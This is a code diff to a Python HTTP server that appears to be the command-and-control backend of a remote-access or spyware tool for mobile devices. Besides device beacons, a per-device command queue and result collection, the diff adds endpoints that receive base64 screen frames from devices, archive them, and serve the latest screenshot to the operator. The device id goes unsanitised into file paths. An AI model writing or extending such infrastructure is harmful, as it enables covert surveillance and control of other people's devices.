@@ -1,7 +1,7 @@
 # language: Python, file: server.py, target: Python 3.8+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse, parse_qs
-import threading, base64, time
+import threading, base64, time, os
 
 DEVICES = {}
 RESULTS = {}
@@ -26,6 +26,18 @@ class Handler(BaseHTTPRequestHandler):
         elif p.path == "/results":
             did = q.get("id", [""])[0]
             self._send("\n---\n".join(RESULTS.get(did, [])[-5:]) or "NONE")
+        elif p.path == "/lastframe":
+            did = q.get("id", [""])[0]
+            try:
+                with open(f"frames/{did}/last.jpg", "rb") as f:
+                    data = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.send_header("Cache-Control", "no-store")
+                self.end_headers()
+                self.wfile.write(data)
+            except FileNotFoundError:
+                self._send("NONE")
         elif p.path == "/list":
             now = time.time()
             out = []
@@ -49,6 +61,17 @@ class Handler(BaseHTTPRequestHandler):
                 "battery": params.get("battery", ["?"])[0],
             }
             print(f"[beacon] {did} | model={DEVICES[did]['model']} | bat={DEVICES[did]['battery']}", flush=True)
+        elif p.path == "/screen":
+            did = params.get("id", [""])[0]
+            frame = params.get("frame", [""])[0]
+            n = params.get("n", ["0"])[0]
+            try:
+                raw = base64.b64decode(frame)
+                os.makedirs(f"frames/{did}", exist_ok=True)
+                open(f"frames/{did}/last.jpg", "wb").write(raw)
+                open(f"frames/{did}/{int(time.time()*1000)}_{n}.jpg", "wb").write(raw)
+            except Exception:
+                pass
         elif p.path == "/queue":
             did = params.get("id", [""])[0]
             cmd = params.get("cmd", [""])[0]
